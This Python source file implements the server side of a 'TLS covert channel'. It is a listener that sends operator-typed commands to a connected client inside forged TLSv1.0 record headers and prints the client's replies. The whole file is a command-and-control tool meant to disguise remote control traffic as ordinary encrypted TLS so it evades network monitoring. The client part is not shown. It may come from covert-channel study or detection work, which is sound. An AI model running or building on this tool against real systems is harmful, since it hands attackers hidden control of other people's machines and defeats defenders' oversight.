
##
# @file TLSserver.py
# 
# @brief this file contains packets for the TLS covert channel
#           intended to run on the server side. 


import socket
import argparse
import time


def encodePacket(data):
    """! This function encodes the data into a TLS packet.
    
    @param data  The data to send to the client.

    @return  A byte array containing the full packet to send.
    """
    ##The standard TLSv1.0 header
    tlsHeader = bytes([0x17,0x03,0x01])
    length = len(data)
    toSend = tlsHeader + length.to_bytes(2, 'big') + data
    return toSend

def recievePacket(sock):
    """! This function receives a packet from the client.

    @param sock  The socket descriptor to read from.

    @return  The raw data recieved from the client, sans header.
    """
    ##The array of data received - TODO, why is this here?
    data = bytearray() 
    ##The TLS header received
    headIn = sock.recv(5)
    lenfromhead = int.from_bytes(headIn[3:], "big")
    return sock.recv(lenfromhead)


def run(port):
    """! This function runs the server in an infinite loop until the client exits.

    @param port  The port number the server listens on. 
    """
    while True:
        #Loop and wait for connections
        print("Waiting for connection...")
        ##The socket to send and receive data with
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        sock.bind(('0.0.0.0', int(port)))
        sock.listen()
        sock, addr = sock.accept()
        print("Connected to : {}".format(addr))
        print("Type 'exit' to disconnect.")
        #Recieve initiallization
        recievePacket(sock) #TODO - does this mean it could be any packet?
        while True:
            ##The command the user types
            command = input(">")
            toSend = encodePacket(command.encode())
            if command == "exit":
                print("Sending exit...")
                try:
                    sock.send(toSend)
                finally:
                    sock.close()
                    print(f"Lost connection to {addr}")
                    break
            else:
                try:
                    sock.send(toSend)
                except:
                    sock.close()
                    print(f"Lost connection to {addr}")
                    break
            response = recievePacket(sock)
            print(response.decode("utf-8"))

##
#TODO - what does this do? 
#
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Program to provide TLS covert channel listiner.',
                                 usage="\n"
                                       "%(prog)s [PORT]"
                                       "\nUse '%(prog)s -h' for more information.")
    parser.add_argument('port', help="Port to listen on.")
    args = parser.parse_args()
    run(args.port)


